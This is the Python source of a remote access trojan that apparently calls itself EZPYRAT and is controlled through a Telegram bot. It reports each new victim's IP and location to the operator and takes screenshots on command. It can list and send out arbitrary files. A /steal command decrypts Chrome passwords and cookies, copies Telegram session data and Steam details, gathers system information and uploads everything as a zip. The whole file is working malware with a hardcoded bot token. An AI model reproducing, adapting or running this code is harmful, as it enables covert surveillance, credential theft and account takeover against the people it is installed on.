import os
import json
import base64
import shutil
import win32crypt
from Crypto.Cipher import AES
import sqlite3
from distutils.dir_util import copy_tree
import psutil
import GPUtil
import requests
import platform
import telebot
import random
import string
from PIL import ImageGrab
import time
import re

os.chdir(os.getenv("TMP"))
tgtoken = "AAFMU2xn0iy8jTwGGqqNWSkRgEqJehhLgFI"
userid = 1111262860
tb = telebot.TeleBot(tgtoken)


uname = platform.uname()
resp = requests.get("http://ip-api.com/json/").json()
rccode = resp["countryCode"]
rip = resp["query"]
tgmessage = f"""Someone just opened the RAT!
Info:
🇺🇸 Country: {rccode}
💎 IP: {rip}
💻 PC Name: {uname.node}

Type /commands to get list of available commands!
"""
tb.send_message(userid, tgmessage)


@tb.message_handler(commands=["commands"])
def commands(message):
    tgcommands = f"""Available commands:
    
    📸 /screenshot - Doing screenshot
    💎 /steal - Stealer function, steals passwords, cookies etc and sends em to you
    📍 /geolocate - Geolocates victim
    📂 /grabfile - Grab a file from victim's PC with path
    🗂 /showfiles [path] - Shows files in this path (type "`" instead of " ")
    ❓ /commands - Shows list of available commands
    """
    tb.send_message(userid, tgcommands)

@tb.message_handler(commands=["screenshot"])
def screenshot(message):
    tb.send_message(userid, "Doing screenshot...")
    ss = ImageGrab.grab()
    ss.save("Screenshot.jpg")
    f = open("Screenshot.jpg", "rb")
    tb.send_photo(userid, f)
    f.close()


@tb.message_handler(commands=["geolocate"])
def geolocate(message):
    tb.send_message(userid, "Geolocating victim...")
    resp = requests.get("http://ip-api.com/json/").json()
    countryname = resp["country"]
    regionname = resp["regionName"]
    city = resp["city"]
    lat = resp["lat"]
    lon = resp["lon"]
    tb.send_location(userid, lat, lon)
    tb.send_message(userid, f"Country: {countryname}\nRegion: {regionname}\nCity: {city}\nCoords: {lat}, {lon}\n\nInformation may be not accurate!")


@tb.message_handler(commands=["grabfile"])
def grabfile_choose(message):
    msg = tb.send_message(userid, "Type path: ")
    tb.register_next_step_handler(message, grabfile)


def grabfile(message):
    try:
        gfilepath = os.path.expanduser(message.text)
        if os.path.getsize(gfilepath) < 10000000:
            f = open(gfilepath, "rb")
            tb.send_document(userid, f)
            f.close()
        else:
            tb.send_message(userid, "This file is bigger than 10 MB!")
    except:
        tb.send_message(userid, "This file isn't exists!")


@tb.message_handler(commands=["showfiles"])
def showfiles(message):
    try:
        gfilepath = re.sub("`", " ", str(message.text).split()[1:][0])
    except:
        pass
    try:
        filelist = os.listdir(gfilepath)
        filesindir = "Files in directory " + gfilepath + ":\n"
        for i in filelist:
            filesindir += i + "\n"
        tb.send_message(userid, filesindir)
    except:
        tb.send_message(userid, "This directory isn't exists or its private!")


@tb.message_handler(commands=["steal"])
def steal(message):
    tb.send_message(userid, "Stealing cookies and passwords...")
    os.chdir(os.getenv("TMP"))
    os.mkdir("eps_")
    os.chdir("eps_")
    
    letterss = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}~`\\|;:'\",<.>/?".split()
    worklog = ""
    fpasswords = b""
    fcookies = ""
    cookiedir = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Cookies2"
    passdir = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
    startdir = os.getcwd()
    os.mkdir("Browsers")
    os.chdir("Browsers")
    shutil.copy(cookiedir, "Cookies.db")
    shutil.copy(passdir, "LoginData.db")
    
    encrypted_key = None
    with open(os.getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Local State", "r") as file:
        encrypted_key = json.loads(file.read())["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key)
    encrypted_key = encrypted_key[5:]
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    
    conn = sqlite3.connect("Cookies.db")
    c = conn.cursor()
    c.execute("SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies")
    
    for host_key, name, value, path, expires_utc, is_secure, is_httponly, encrypted_value in c.fetchall():
        try:
            decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode("utf-8") or value or 0
        except:
            cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
            decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:])
        fcookies += str(host_key) + "\t" + str(is_httponly) + "\t/\t" + str(is_secure) + "\t" + str(expires_utc) + "\t" + str(name) + "\t" + str(decrypted_value.decode()) + "\n"
    
    f = open("Cookies.txt", "w")
    f.write(fcookies)
    f.close()
    
    conn.close()
    
    conn = sqlite3.connect("LoginData.db")
    c = conn.cursor()
    c.execute("SELECT action_url, username_value, password_value FROM logins")
    
    for action_url, username_value, password_value in c.fetchall():
        cccc = 0
        iv = password_value[3:15]
        payload = password_value[15:]
        cipher = AES.new(decrypted_key, AES.MODE_GCM, iv)
        try:
            password = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1].decode("utf-8")
        except:
            password = str(cipher.decrypt(payload)[:-16], "utf-8", "ignore")
        fpasswords += b"URL: " + action_url.encode() + b"\n"
        fpasswords += b"Username: " + username_value.encode() + b"\n"
        fpasswords += b"Password: " + password.encode() + b"\n\n"
    
    f = open("Passwords.txt", "wb")
    f.write(fpasswords)
    f.close()
    
    conn.close()
    os.remove("Cookies.db")
    os.remove("LoginData.db")
    
    os.chdir(startdir)
    os.mkdir("Other stuff")
    os.chdir("Other stuff")
    os.mkdir("Telegram")
    os.chdir("Telegram")
    
    tb.send_message(userid, "Stealing sessions...")
    diskletters = ["A", "B", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"]
    pcdisks = ["C"]
    for i in diskletters:
        if os.path.exists(i + ":\\"):
            pcdisks.append(i + ":\\")
    
    tdatapath = ""
    for i in pcdisks:
        for root, dirs, files in os.walk(i):
            if "Telegram.exe" in files:
                tdatapath = root
                break
    
    if tdatapath != "":
        try:
            shutil.copy(tdatapath + "\\log.txt", "log.txt")
        except:
            pass
        try:
            copy_tree(tdatapath + "\\tdata", "tdata")
        except:
            pass
    try:
        os.chdir("tdata")
        shutil.rmtree("emoji")
        os.chdir("user_data")
        shutil.rmtree("mediacache")
        os.chdir(os.path.split(os.getcwd())[0])
        os.chdir(os.path.split(os.getcwd())[0])
    except:
        os.chdir(os.path.split(os.getcwd())[0])
    
    os.chdir(os.path.split(os.getcwd())[0])
    os.chdir(os.path.split(os.getcwd())[0])
    os.mkdir("Steam")
    os.chdir("Steam")
    
    diskletters = ["A", "B", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"]
    pcdisks = ["C"]
    for i in diskletters:
        if os.path.exists(i + ":\\"):
            pcdisks.append(i + ":\\")
    
    steampath = ""
    steamgames = ""
    for i in pcdisks:
        for root, dirs, files in os.walk(i):
            if "steamerrorreporter.exe" in files:
                steampath = root
                break
    
    if steampath != "":
        f = open("Steam info.txt", "w")
        try:
            plog = open(steampath + "\\logs\\parental_log.txt", "r").read().split("\n")
            steamid = plog[-6].partition("ID: ")[2]
            parenabled = plog[-5].partition("ed: ")[2]
            for i in os.listdir(steampath+"\\steamapps\\common"):
                steamgames += i + "\n"
            steaminfo = "Account ID: " + str(steamid) + "\nParental control enabled: " + parenabled + "\n\nDownloaded steam games:\n" + steamgames
        except Exception as e:
            pass
        f.write(steaminfo)
        f.close()
    os.chdir(os.path.split(os.getcwd())[0])
    tb.send_message(userid, "Stealing other info...")
    f = open("TM Processes.txt", "w")
    proclist = ""
    for proc in psutil.process_iter():
        proc.dict = proc.as_dict(["username", "name"])
        if proc.dict.get("username") is None:
            continue
        if os.getlogin() in proc.dict.get("username"):
            proclist += proc.dict.get("name") + "\n"
    f.write(proclist)
    f.close()
    
    os.chdir(os.path.split(os.getcwd())[0])
    
    uname = platform.uname()
    try:
        gpus = GPUtil.getGPUs()
    except:
        pass
    geninfo = """# STEALED BY EZPYRAT
    
    """
    geninfo += f"System: {uname.system}\n"
    geninfo += f"Node Name: {uname.node}\n"
    geninfo += f"Release: {uname.release}\n"
    geninfo += f"Version: {uname.version}\n"
    geninfo += f"Machine: {uname.machine}\n"
    geninfo += f"Processor: {uname.processor}\n"
    try:
        for gpu in gpus:
            geninfo += f"GPU: {gpu.name}\n"
    except:
        pass
    geninfo += "\n"
    try:
        resp = requests.get("http://ip-api.com/json/").json()
        rip = resp["query"]
        rcountry = resp["country"]
        rccode = resp["countryCode"]
        rregion = resp["regionName"]
        rcity = resp["city"]
        rzipcode = resp["zip"]
        rtz = resp["timezone"]
        risp = resp["isp"]
        rlat = resp["lat"]
        rlon = resp["lon"]
        geninfo += f"IP: {rip}\n"
        geninfo += f"Country: {rcountry}\n"
        geninfo += f"Region: {rregion}\n"
        geninfo += f"City: {rcity}\n"
        geninfo += f"ZIP code: {rzipcode}\n"
        geninfo += f"Time zone: {rtz}\n"
        geninfo += f"ISP: {risp}\n"
        geninfo += f"Latitude: {rlat}\n"
        geninfo += f"Longitude: {rlon}\n"
    except:
        pass
    f = open("General info.txt", "w")
    f.write(geninfo)
    f.close()
    tb.send_message(userid, "Creating screenshot...")
    ss = ImageGrab.grab()
    ss.save("Screenshot.jpg")
    tb.send_message(userid, "Saving info...")
    os.chdir(os.path.split(os.getcwd())[0])
    shutil.make_archive("eps_", "zip", "eps_")
    fzipname = rccode + "_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16)) + ".zip"
    os.rename("eps_.zip", fzipname)
    shutil.rmtree("eps_")
    
    f = open(os.path.abspath(fzipname), "rb")
    tb.send_document(userid, f, timeout=10)
    f.close()
    os.remove(fzipname)
    
    foundses = "Sessions found:\n\n"
    if tdatapath != "":
        foundses += "Telegram\n"
    if steampath != "":
        foundses += "Steam\n"
    if foundses != "Sessions found:\n\n":
        tb.send_message(userid, foundses)


tb.polling(none_stop=True)
